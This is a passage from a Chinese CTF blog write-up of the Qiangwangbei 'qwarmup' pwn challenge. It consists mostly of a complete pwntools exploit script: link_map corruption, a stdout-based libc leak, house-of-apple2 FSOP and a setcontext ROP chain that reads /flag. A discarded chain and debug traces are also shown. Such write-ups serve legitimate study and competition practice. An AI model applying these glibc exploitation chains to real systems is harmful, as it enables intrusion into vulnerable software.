class="hljs-number">0xdeadbeef</span>, pop_rax],<br>    <span class="hljs-number">0xe0</span>: [<span class="hljs-number">2</span>, syscall_ret],<br>    <span class="hljs-comment"># read(3,&amp;buf,0xff)</span><br>    <span class="hljs-number">0xf0</span>: [pop_rdi, <span class="hljs-number">3</span>],<br>    <span class="hljs-number">0x100</span>: [pop_rsi, flag_addr+<span class="hljs-number">0x300</span>],      <br>    <span class="hljs-number">0x110</span>:[pop_rdx_r12, <span class="hljs-number">0xff</span>], <br>    <span class="hljs-number">0x120</span>:[<span class="hljs-number">0</span>, read_addr], <br>    <span class="hljs-comment"># write(1,&amp;buf,0xff)</span><br>    <span class="hljs-number">0x130</span>:[pop_rdi, <span class="hljs-number">1</span>],<br>    <span class="hljs-number">0x140</span>:[pop_rsi, flag_addr+<span class="hljs-number">0x300</span>], <br>    <span class="hljs-number">0x150</span>:[pop_rdx_r12, <span class="hljs-number">0xff</span>],<br>    <span class="hljs-number">0x160</span>:[<span class="hljs-number">0</span>,write_addr]<br>&#125;)<br>write(<span class="hljs-number">0</span>,rop)<br><br><br><span class="hljs-comment">#debug()</span><br><br><span class="hljs-comment"># 3. trigger _IO_flush_all</span><br>write(link_map_offset+<span class="hljs-number">0x40</span>+<span class="hljs-number">5</span>*<span class="hljs-number">0x8</span>, <span class="hljs-string">b&#x27;\xb8&#x27;</span>, <span class="hljs-literal">False</span>)<br><br>pi()<br></code></pre></td></tr></table></figure>





<h3 id="废弃链子"><a href="#废弃链子" class="headerlink" title="废弃链子"></a>废弃链子</h3><p><strong>前置条件：rdx不为0，看一个师傅的链子是可以的，但是本地调试的时候，调进IO函数前，rdx刚好为0，所以换条链子</strong></p>
<p>画了个流程图，还是存一下</p>
<p><img src="/../md/23.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<ol>
<li><p><strong>FSOP：控制IO结构体，目的是跳转到heap</strong></p>
<p>为了方便修改flags，利用<code>house of apple2</code>的链子3：控制<code>_IO_wdefault_xsgetn函数</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;_flags: 0x800</span><br><span class="hljs-string">    </span><br><span class="hljs-string">vtable: _IO_wstrn_jumps/_IO_wmem_jumps/_IO_wstr_jumps地址（加减偏移），使其能成功调用_IO_wdefault_xsgetn即可</span><br><span class="hljs-string">    </span><br><span class="hljs-string">_mode:  大于0，即满足*(fp + 0xc0) &gt; 0</span><br><span class="hljs-string">    </span><br><span class="hljs-string">_wide_data: 可控堆地址A，即满足*(fp + 0xa0) = A</span><br><span class="hljs-string">    _wide_data-&gt;_IO_read_end == _wide_data-&gt;_IO_read_ptr设置为0，即满足*(A + 8) = *A</span><br><span class="hljs-string">	_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base，即满足*(A + 0x20) &gt; *(A + 0x18)</span><br><span class="hljs-string">	_wide_data-&gt;_wide_vtable设置为可控堆地址B，即满足*(A + 0xe0) = B</span><br><span class="hljs-string">	_wide_data-&gt;_wide_vtable-&gt;overflow设置为地址C用于劫持RIP，即满足*(B + 0x18) = C</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment">#定位_IO_2_1_stdout_: pwndbg&gt; p stdout  &amp;&amp; pwndbg&gt; ptype stdout</span><br><span class="hljs-comment">#flags  		 pwndbg&gt; p &amp;stdout-&gt;_flags</span><br>write(<span class="hljs-number">0x2E7770</span> , p64(<span class="hljs-number">0x800</span>))<br><span class="hljs-comment">#_mode  		 pwndbg&gt; p &amp;stdout-&gt;_mode</span><br>write(<span class="hljs-number">0x2E7770</span>+<span class="hljs-number">192</span> , p8(<span class="hljs-number">0xff</span>))<br><span class="hljs-comment">#vtable 		 pwndbg&gt; p &amp;stdout-&gt;_unused2  + 20</span><br>write(<span class="hljs-number">0x2E7770</span>+<span class="hljs-number">216</span> , p64(_IO_wstrn_jumps+<span class="hljs-number">0x28</span>)) <span class="hljs-comment">#_IO_wdefault_xsgetn - _IO_wstrn_overflow</span><br><span class="hljs-comment">#_IO_save_base: rdi</span><br>write(<span class="hljs-number">0x2E7770</span>+<span class="hljs-number">72</span>, p64(heap_base))  <br><br><span class="hljs-comment">#_wide_data      pwndbg&gt; p &amp;stdout-&gt;_wide_data</span><br><span class="hljs-comment">#write(0x2E7770+160, p64(heap_base))</span><br><br><span class="hljs-comment">#查看_IO_2_1_stdout结构体 p  *(struct _IO_FILE_plus *) stdout</span><br><span class="hljs-comment">#查看_wide_data结构体 p  *(struct _IO_wide_data *) stdout</span><br><span class="hljs-comment">#_wide_data-&gt;_IO_read_end    p &amp;stdout-&gt;_wide_data-&gt;_IO_read_end</span><br>write(<span class="hljs-number">0x2E6998</span>, p8(<span class="hljs-number">0</span>))<br><span class="hljs-comment">#_wide_data-&gt;_IO_write_ptr &gt; </span><br>write(<span class="hljs-number">0x2E6998</span>+<span class="hljs-number">24</span>, p8(<span class="hljs-number">0xff</span>))<br><span class="hljs-comment">#_wide_data-&gt;_wide_vtable-&gt;overflow</span><br>write(<span class="hljs-number">0x2E6998</span>+<span class="hljs-number">216</span>, p64(heap_base+<span class="hljs-number">0x10</span>))<br><br></code></pre></td></tr></table></figure>


</li>
<li><p><strong>布置ROP链–setcontext + magic_gadget + orw ，getshell</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python">flag_addr = heap_base + <span class="hljs-number">0x20</span><br>orw_addr = heap_base + <span class="hljs-number">0xC0</span><br>pause()<br>rop = flat(&#123;<br>    <span class="hljs-number">0x00</span>: [<span class="hljs-string">b&#x27;/flag\x00\x00\x00&#x27;</span>, Magic],<br>    <span class="hljs-number">0x10</span>: [setcontext_61, heap_base+<span class="hljs-number">0x10</span>],<br>    <span class="hljs-number">0x20</span>: [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>],<br>    <span class="hljs-number">0x30</span>: [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>],<br>    <span class="hljs-number">0x40</span>: [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>], <span class="hljs-comment"># &#x27;/flag&#x27;</span><br>    <span class="hljs-number">0x50</span>: [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>],<br>    <span class="hljs-number">0x60</span>: [<span class="hljs-number">0</span>, orw_addr],<br>    <span class="hljs-number">0x70</span>: [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>],<br>    <span class="hljs-number">0x80</span>: [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>], <span class="hljs-comment"># open(&#x27;/flag&#x27;,0,0)</span><br>    <span class="hljs-number">0x90</span>: [orw_addr, ret],<br>    <span class="hljs-number">0xa0</span>: [pop_rdi, flag_addr], <span class="hljs-comment"># open(&#x27;/flag\0\0\0&#x27;, 0)</span><br>    <span class="hljs-number">0xb0</span>: [pop_rsi, <span class="hljs-number">0</span>],<br>    <span class="hljs-number">0xc0</span>: [open_addr, pop_rdi], <span class="hljs-comment"># read(3,&amp;buf,0xff)</span><br>    <span class="hljs-number">0xd0</span>: [<span class="hljs-number">3</span>, pop_rsi],<br>    <span class="hljs-number">0xe0</span>: [flag_addr+<span class="hljs-number">0x300</span>, pop_rdx_r12],<br>    <span class="hljs-number">0xf0</span>: [<span class="hljs-number">0xff</span>, <span class="hljs-number">0</span>],      <span class="hljs-comment"># write(1,&amp;buf,0x40)</span><br>    <span class="hljs-number">0x100</span>:[read_addr, pop_rdi], <br>    <span class="hljs-number">0x110</span>:[<span class="hljs-number">1</span>, pop_rsi], <br>    <span class="hljs-number">0x120</span>:[flag_addr+<span class="hljs-number">0x300</span>, pop_rdx_r12], <br>    <span class="hljs-number">0x130</span>:[<span class="hljs-number">0xff</span>, <span class="hljs-number">0</span>], <br>    <span class="hljs-number">0x140</span>:[write_addr, <span class="hljs-number">0</span>], <br>&#125;)<br>write(<span class="hljs-number">0</span>,rop)<br></code></pre></td></tr></table></figure>




</li>
<li><p><strong>触发_IO_flush_all</strong></p>
<p><code>write(link_map_offset+0x40+5*0x8, b&#39;\xb8&#39;, False)</code></p>
</li>
</ol>
<p><strong>调试流程</strong></p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sqf">write<br>	<span class="hljs-variable">_IO_wdefault_xsgetn</span><br>		<span class="hljs-variable">__wunderflow</span><br>        	<span class="hljs-variable">_IO_switch_to_wget_mode</span><br>            	<span class="hljs-variable">_IO_WOVERFLOW</span><br>                	*(fp-&gt;<span class="hljs-variable">_wide_data</span>-&gt;<span class="hljs-variable">_wide_vtable</span> + <span class="hljs-number">0</span>x18)(fp)<br><br>► <span class="hljs-number">0</span>x55bf306484d1    <span class="hljs-built_in">call</span>   write@plt                &lt;write@plt&gt;<br><br>► <span class="hljs-number">0</span>x7f7d342e8c6f &lt;<span class="hljs-variable">_IO_flush_all_lockp</span>+<span class="hljs-number">207</span>&gt;    <span class="hljs-built_in">call</span>   qword ptr [rax + <span class="hljs-number">0</span>x18]        &lt;<span class="hljs-variable">_IO_wdefault_xsgetn</span>&gt;<br><br><br></code></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: UTF-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>banary = <span class="hljs-string">&quot;./qwarmup&quot;</span><br>elf = ELF(banary)<br>ip = <span class="hljs-string">&#x27;1&#x27;</span><br>port = <span class="hljs-number">1</span><br><br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span>(local==<span class="hljs-number">1</span>):<br>	p = process(banary)<br><span class="hljs-keyword">else</span>:<br>	p = remote(ip, port)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>	gdb.attach(p)<br>	pause()<br>	<br>s = <span class="hljs-keyword">lambda</span> data : p.send(data)<br>sl = <span class="hljs-keyword">lambda</span> data : p.sendline(data)<br>sa = <span class="hljs-keyword">lambda</span> text, data : p.sendafter(text, data)<br>sla = <span class="hljs-keyword">lambda</span> text, data : p.sendlineafter(text, data)<br>r = <span class="hljs-keyword">lambda</span> : p.recv()<br>ru = <span class="hljs-keyword">lambda</span> text : p.recvuntil(text)<br>uu32 = <span class="hljs-keyword">lambda</span> : u32(p.recvuntil(<span class="hljs-string">b&quot;\xff&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>uu64 = <span class="hljs-keyword">lambda</span> : u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>lg = <span class="hljs-keyword">lambda</span> s : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m %s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br>pi = <span class="hljs-keyword">lambda</span> : p.interactive()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>(<span class="hljs-params">offset, <span class="hljs-built_in">bytes</span>, tag=<span class="hljs-literal">True</span></span>):<br>    <span class="hljs-keyword">for</span> i, byte <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(<span class="hljs-built_in">bytes</span>):<br>        p.send(p64(offset + i))<br>        p.send(p8(byte))<br>        <span class="hljs-keyword">if</span> tag:<br>            p.recvuntil(<span class="hljs-string">b&quot;Success!&quot;</span>)<br><span class="hljs-comment">#---------------------- 1.pwn Size &amp; leak_libc  -------------------</span><br><span class="hljs-comment">#0.malloc</span><br>s(p32(<span class="hljs-number">0xf0000</span>))<br><br><span class="hljs-comment">#1. pwn size</span><br>libc_offset = <span class="hljs-number">0xf4000</span> - <span class="hljs-number">0x10</span>   	<span class="hljs-comment">#vmmap</span><br>ld_offset = <span class="hljs-number">0x2F8000</span> - <span class="hljs-number">0x10</span>  		<span class="hljs-comment">#vmmap</span><br>size_offset = <span class="hljs-number">0x408c</span>   		<span class="hljs-comment">#IDA, elf_base+offset</span><br><br>link_map_offset = <span class="hljs-number">0x3302e0</span> - <span class="hljs-number">0x10</span> 	<span class="hljs-comment">#p _rtld_global</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(elf.got[<span class="hljs-string">&quot;write&quot;</span>]))<br><br><br><span class="hljs-comment"># write@got: 0x00007fxx xxxxxxxx</span><br><span class="hljs-comment"># &amp;size-4 == write@got</span><br>write(link_map_offset, p8(size_offset-<span class="hljs-number">4</span> - elf.got[<span class="hljs-string">&quot;write&quot;</span>])) <br><br><br><span class="hljs-comment">#2.leak_libc</span><br>_IO_2_1_stdout_ = libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]<br>lg(<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>)<br>write(<span class="hljs-number">0x2e7770</span>, p32(<span class="hljs-number">0xfbad1800</span>)) <span class="hljs-comment"># _flags</span><br>write(<span class="hljs-number">0x2e7770</span>+<span class="hljs-number">0x28</span>, <span class="hljs-string">b&#x27;\xff&#x27;</span>)    <span class="hljs-comment"># _IO_write_ptr</span><br><br><span class="hljs-comment"># DT_STRTAB+34 = write =&gt; DT_DEBUG+34 = call_func</span><br>write(<span class="hljs-number">0x330108</span> + <span class="hljs-number">0x22</span>, <span class="hljs-string">b&quot;_IO_flush_all&quot;</span>) <span class="hljs-comment"># r_debug+34</span><br><br><span class="hljs-comment"># trigger _IO_flush_all</span><br>write(link_map_offset+<span class="hljs-number">0x40</span>+<span class="hljs-number">5</span>*<span class="hljs-number">0x8</span>, <span class="hljs-string">b&#x27;\xb8&#x27;</span>, <span class="hljs-literal">False</span>) <span class="hljs-comment">#DT_STRTAB --&gt; DT_DEBUG</span><br>libc_base = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x1F5750</span> <br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>)<br><br><span class="hljs-comment">#back</span><br>write(link_map_offset+<span class="hljs-number">0x40</span>+<span class="hljs-number">5</span>*<span class="hljs-number">0x8</span>, <span class="hljs-string">b&#x27;\x78&#x27;</span>)<br><br><span class="hljs-comment">#----------------- 2. FSOP --&gt;  ROP  ----------------</span><br>heap_base = libc_base - <span class="hljs-number">0xf4000</span> - <span class="hljs-number">0x10</span><br>lg(<span class="hljs-string">&#x27;heap_base&#x27;</span>)<br>orw_base =  heap_base + <span class="hljs-number">0x110</span> - <span class="hljs-number">0x18</span><br><br>setcontext_61 = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>] +<span class="hljs-number">61</span><br>svcudp_reply26 = libc_base + libc.sym[<span class="hljs-string">&#x27;svcudp_reply&#x27;</span>] +<span class="hljs-number">26</span><br>pop_rax = libc_base + <span class="hljs-number">0x00000000000446a0</span><br>pop_r12_r13_r14 = libc_base + <span class="hljs-number">0x0000000000037be5</span> <span class="hljs-comment">#pop r12 ; pop r13 ; pop r14 ; ret</span><br>pop_rdi = libc_base + <span class="hljs-number">0x2da82</span><br>pop_rsi = libc_base + <span class="hljs-number">0x37bea</span><br>pop_rdx_r12 = libc_base + <span class="hljs-number">0x1070f1</span> <span class="hljs-comment">#pop rdx ; pop r12 ; ret</span><br>leave_ret = libc_base + <span class="hljs-number">0x0000000000052d52</span><br>ret = libc_base + <span class="hljs-number">0x2c7ad</span><br>syscall = libc_base + <span class="hljs-number">0x000000000002d564</span><br><br>open_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>read_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write_addr= libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br><br><span class="hljs-comment">#0x00000000001471e0 : mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</span><br>Magic = libc_base + <span class="hljs-number">0x1471e0</span><br><br>_IO_wstrn_jumps = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_wstrn_jumps&#x27;</span>]<br><br><br><span class="hljs-comment"># 1. FSOP --&gt; IO  --&gt; heap </span><br><span class="hljs-comment"># _IO_2_1_stdout_</span><br><br>write(<span class="hljs-number">0x2E7770</span> , p64(c_uint32(~(<span class="hljs-number">2</span> | <span class="hljs-number">0x8</span> | <span class="hljs-number">0x800</span>)).value))  <span class="hljs-comment">#flags</span><br>write(<span class="hljs-number">0x2E7770</span>+<span class="hljs-number">192</span> , p8(<span class="hljs-number">0xff</span>)) <span class="hljs-comment">#_mode</span><br>write(<span class="hljs-number">0x2E7770</span>+<span class="hljs-number">72</span>, p64(heap_base+<span class="hljs-number">0x30</span>))  <span class="hljs-comment">#_IO_save_base rdi</span><br>write(<span class="hljs-number">0x2E7770</span>+<span class="hljs-number">216</span>, p64(_IO_wstrn_jumps+<span class="hljs-number">0x28</span>))  <span class="hljs-comment">#vtable</span><br><br><span class="hljs-comment">#  _IO_2_1_stdout_ -&gt; _wide_data</span><br><span class="hljs-comment">#write(0x2E69A8, )  #_IO_wide_data_1</span><br>write(<span class="hljs-number">0x2E6998</span>, p8(<span class="hljs-number">0</span>)) 		  <span class="hljs-comment">#_wide_data-&gt;_IO_read_ptr</span><br><br>write(<span class="hljs-number">0x2E6998</span>+<span class="hljs-number">24</span>, p8(<span class="hljs-number">0xff</span>))<br><br>write(<span class="hljs-number">0x2E6998</span>+<span class="hljs-number">224</span>, p64(heap_base+<span class="hljs-number">0x20</span>)) <span class="hljs-comment">#_wide_data-&gt;_wide_vtable: rdi</span><br><br><br><br><span class="hljs-comment"># 2. ROP -- ORW</span><br>flag_addr = heap_base + <span class="hljs-number">0x20</span><br>orw_addr = heap_base + <span class="hljs-number">0xC0</span><br><br>rop = flat(&#123;<br>    <span class="hljs-number">0x00</span>: [<span class="hljs-string">b&#x27;/flag\x00\x00\x00&#x27;</span>, Magic],<br>    <span class="hljs-number">0x10</span>: [setcontext_61, heap_base+<span class="hljs-number">0x10</span>],<br>    <span class="hljs-number">0x20</span>: [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>],<br>    <span class="hljs-number">0x30</span>: [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>],<br>    <span class="hljs-number">0x40</span>: [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>], <span class="hljs-comment"># &#x27;/flag&#x27;</span><br>    <span class="hljs-number">0x50</span>: [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>],<br>    <span class="hljs-number">0x60</span>: [<span class="hljs-number">0</span>, orw_addr],<br>    <span class="hljs-number">0x70</span>: [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>],<br>    <span class="hljs-number">0x80</span>: [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>], <span class="hljs-comment"># open(&#x27;/flag&#x27;,0,0)</span><br>    <span class="hljs-number">0x90</span>: [orw_addr, ret],<br>    <span class="hljs-number">0xa0</span>: [pop_rdi, flag_addr], <span class="hljs-comment"># open(&#x27;/flag\0\0\0&#x27;, 0)</span><br>    <span class="hljs-number">0xb0</span>: [pop_rsi, <span class="hljs-number">0</span>],<br>    <span class="hljs-number">0xc0</span>: [open_addr, pop_rdi], <span class="hljs-comment"># read(3,&amp;buf,0xff)</span><br>    <span class="hljs-number">0xd0</span>: [<span class="hljs-number">3</span>, pop_rsi],<br>    <span class="hljs-number">0xe0</span>: [flag_addr+<span class="hljs-number">0x300</span>, pop_rdx_r12],<br>    <span class="hljs-number">0xf0</span>: [<span class="hljs-number">0xff</span>, <span class="hljs-number">0</span>],      <span class="hljs-comment"># write(1,&amp;buf,0x40)</span><br>    <span class="hljs-number">0x100</span>:[read_addr, pop_rdi], <br>    <span class="hljs-number">0x110</span>:[<span class="hljs-number">1</span>, pop_rsi], <br>    <span class="hljs-number">0x120</span>:[flag_addr+<span class="hljs-number">0x300</span>, pop_rdx_r12], <br>    <span class="hljs-number">0x130</span>:[<span class="hljs-number">0xff</span>, <span class="hljs-number">0</span>], <br>    <span class="hljs-number">0x140</span>:[write_addr, <span class="hljs-number">0</span>], <br>&#125;)<br>write(<span class="hljs-number">0</span>,rop)<br><br><span class="hljs-comment">#pause()</span><br>debug()<br><span class="hljs-comment"># 3. trigger _IO_flush_all</span><br>write(link_map_offset+<span class="hljs-number">0x40</span>+<span class="hljs-number">5</span>*<span class="hljs-number">0x8</span>, <span class="hljs-string">b&#x27;\xb8&#x27;</span>, <span class="hljs-literal">False</span>)<br><span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><br>pi()<br></code></pre></td></tr></table></figure>


                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/Pwn/" class="category-chain-item">Pwn</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/%E5%A0%86%E9%A2%98/">#堆题</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>强网杯qwarmup</div>
      <div>http://csc8.github.io/2023/04/06/qwarmup/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>Csc8</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2023年4月6日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2023/03/31/ret2dl_reslove/" title="ret2dl_reslove">
                        <span class="hidden-mobile">ret2dl_reslove</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
